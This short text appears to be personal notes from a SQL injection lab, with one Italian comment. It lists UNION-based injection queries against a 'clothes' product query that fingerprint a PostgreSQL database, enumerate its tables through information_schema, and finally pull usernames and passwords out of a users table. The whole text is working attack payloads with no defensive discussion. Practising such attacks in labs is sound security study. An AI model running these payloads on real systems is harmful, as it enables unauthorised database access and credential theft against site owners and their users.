select id, content from clothes where category='aaaa' union select  1, version() -- -

-- - è postgres. ora possiamo provare a enumerare le tabelle

select id, content from clothes where category='aaaa' union select  1, table_name from information_schema.tables where table_schema = CURRENT_SCHEMA() -- -

select id, content from clothes where category='aaaa' union select  1, username||password from users -- -